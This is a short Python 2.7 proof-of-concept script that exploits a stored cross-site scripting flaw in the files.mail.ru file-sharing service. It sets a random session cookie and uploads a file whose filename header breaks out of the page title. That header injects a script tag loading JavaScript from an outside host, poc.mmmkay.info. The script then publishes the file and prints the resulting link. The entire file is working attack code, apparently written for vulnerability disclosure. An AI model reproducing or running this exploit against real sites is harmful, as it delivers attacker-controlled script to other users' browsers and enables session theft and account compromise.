#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

import random
import math
import re
import requests
import json
from urlparse import parse_qs
import urllib


def encode_id(value):
    base = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz*'
    b = len(base)
    encoded = ''
    while value:
        encoded = base[int(value % b)] + encoded
        value = math.floor(value/b)

    return encoded


def get_uploader_url(session):
    req = session.post(
        'http://files.mail.ru/cgi-bin/files/fajaxcall',
        data={
            'ajax_call': 1,
            'func_name': 'cbChooseStorage'
        }
    )
    uploader = json.loads(req.text)[2]
    return uploader['host'] + uploader['url'] + '?swf=1&upload=1'


def upload_xss(session, url, xss):
    payload = 'any'
    headers = {
        'Content-Disposition': 'attachment; filename="' + urllib.quote('</title>' + xss, '') + '"',
        'Content-Length': 3,
        'Content-Type': 'application/octet-stream'
    }
    req = session.post(url, data=payload, headers=headers)
    file_id = parse_qs(req.text)['vfileid'][0]
    return int(file_id)


def get_xss_link(session, file_id):
    mris_ids = '.' + encode_id(file_id) + '.'
    req = session.post('http://files.mail.ru/', data={'mainsend': 'Get link', 'MRIS_IDS': mris_ids})
    return re.search('href="(?P<url>[^"]+)">Files are published</a>', req.text).group('url')

session = requests.Session()
session.headers.update({
    'Accept-Language':  'en-US,en;'
})
session.cookies.update({
    'flsmlrua': ''.join([random.choice('abcdef1234567890') for x in range(32)])
})


uploader_url = get_uploader_url(session)
xss_vector = '''<script src="http://poc.mmmkay.info/static/payload/files_mail.js"></script>'''
uploaded_file_id = upload_xss(session, uploader_url, xss_vector)
link = get_xss_link(session, uploaded_file_id)

print('Url with XSS: ' + link)


